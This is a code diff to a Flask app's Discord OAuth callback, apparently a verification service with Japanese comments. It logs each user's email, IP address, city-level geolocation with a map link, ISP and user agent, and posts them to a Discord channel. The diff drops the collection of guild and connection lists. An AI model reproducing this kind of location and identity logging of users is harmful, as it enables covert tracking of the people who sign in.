@@ -1,9 +1,8 @@
-# main.py
 from flask import Flask, request, render_template
-import requests, json, os, threading, asyncio
+import requests, json, os, threading
 from dotenv import load_dotenv
 from datetime import datetime
-from discord_bot import bot, assign_role, task_queue
+from discord_bot import bot
 from user_agents import parse
 
 load_dotenv()
@@ -13,7 +12,6 @@ ACCESS_LOG_FILE = "access_log.json"
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
-DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
 
@@ -115,18 +113,6 @@ def callback():
 
     headers_auth = {"Authorization": f"Bearer {access_token}"}
     user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
-    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
-    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
-
-    # サーバー参加
-    requests.put(
-        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-        headers={
-            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-            "Content-Type": "application/json",
-        },
-        json={"access_token": access_token},
-    )
 
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
@@ -150,13 +136,7 @@ def callback():
             "email": user.get("email"),
             "avatar_url": avatar_url,
             "locale": user.get("locale"),
-            "verified": user.get("verified"),
-            "mfa_enabled": user.get("mfa_enabled"),
             "premium_type": user.get("premium_type"),
-            "flags": user.get("flags"),
-            "public_flags": user.get("public_flags"),
-            "guilds": guilds,
-            "connections": connections,
         },
         "ip_info": geo,
         "user_agent": {
@@ -170,47 +150,40 @@ def callback():
 
     save_log(user["id"], structured_data)
 
-    # Discord送信をキューに投げる
-    try:
-        d = structured_data["discord"]
-        ip_data = structured_data["ip_info"]
-        ua_data = structured_data["user_agent"]
+    # ✅ Discord送信とロール付与
+    d = structured_data["discord"]
+    ip_data = structured_data["ip_info"]
+    ua_data = structured_data["user_agent"]
 
-        embed_data = {
-            "title": "✅ 新しいアクセスログ",
+    embed_data = {
+        "title": "✅ 新しいアクセスログ",
+        "description": (
+            f"**名前:** {d['username']}#{d['discriminator']}\n"
+            f"**ID:** {d['id']}\n"
+            f"**メール:** {d['email']}\n"
+            f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
+            f"**IP:** {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}\n"
+            f"**国:** {ip_data['country']} / {ip_data['region']} / {ip_data['city']} / {ip_data['zip']}\n"
+            f"**ISP:** {ip_data['isp']} / AS: {ip_data['as']}\n"
+            f"**UA:** {ua_data['raw']}\n"
+            f"**OS:** {ua_data['os']} / ブラウザ: {ua_data['browser']}\n"
+            f"**デバイス:** {ua_data['device']} / Bot判定: {ua_data['is_bot']}\n"
+            f"📍 [地図リンク](https://www.google.com/maps?q={ip_data['lat']},{ip_data['lon']})"
+        ),
+        "thumbnail": {"url": d["avatar_url"]},
+    }
+
+    bot.enqueue_task(embed_data=embed_data, user_id=d["id"])
+
+    if ip_data["proxy"] or ip_data["hosting"]:
+        warn_embed = {
+            "title": "⚠️ 不審なアクセス検出",
             "description": (
-                f"**名前:** {d['username']}#{d['discriminator']}\n"
-                f"**ID:** {d['id']}\n"
-                f"**メール:** {d['email']}\n"
-                f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
-                f"**IP:** {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}\n"
-                f"**国:** {ip_data['country']} / {ip_data['region']} / {ip_data['city']} / {ip_data['zip']}\n"
-                f"**ISP:** {ip_data['isp']} / AS: {ip_data['as']}\n"
-                f"**UA:** {ua_data['raw']}\n"
-                f"**OS:** {ua_data['os']} / ブラウザ: {ua_data['browser']}\n"
-                f"**デバイス:** {ua_data['device']} / Bot判定: {ua_data['is_bot']}\n"
-                f"📍 [地図リンク](https://www.google.com/maps?q={ip_data['lat']},{ip_data['lon']})"
+                f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
+                f"IP: {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}"
             ),
-            "thumbnail": {"url": d["avatar_url"]},
         }
-
-        # ✅ 修正: log_queue → task_queue
-        asyncio.run_coroutine_threadsafe(task_queue.put(embed_data), bot.loop)
-
-        if ip_data["proxy"] or ip_data["hosting"]:
-            warn_msg = {
-                "title": "⚠️ 不審なアクセス検出",
-                "description": (
-                    f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
-                    f"IP: {ip_data['ip']} / Proxy: {ip_data['proxy']} / Hosting: {ip_data['hosting']}"
-                ),
-            }
-            asyncio.run_coroutine_threadsafe(task_queue.put(warn_msg), bot.loop)
-
-        asyncio.run_coroutine_threadsafe(assign_role(d["id"]), bot.loop)
-
-    except Exception as e:
-        print("Embed送信エラー:", e)
+        bot.enqueue_task(embed_data=warn_embed)
 
     return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])
 
@@ -227,12 +200,12 @@ def show_logs():
 
 # Discord Bot をスレッドで起動
 def run_bot():
+    import asyncio
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    bot.run(DISCORD_BOT_TOKEN)
+    bot.run(os.getenv("DISCORD_BOT_TOKEN"))
 
 
-# Flask アプリは Gunicorn で起動するため app.run は不要
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
     print("Discord Bot is running. Flask app should be started with Gunicorn.")
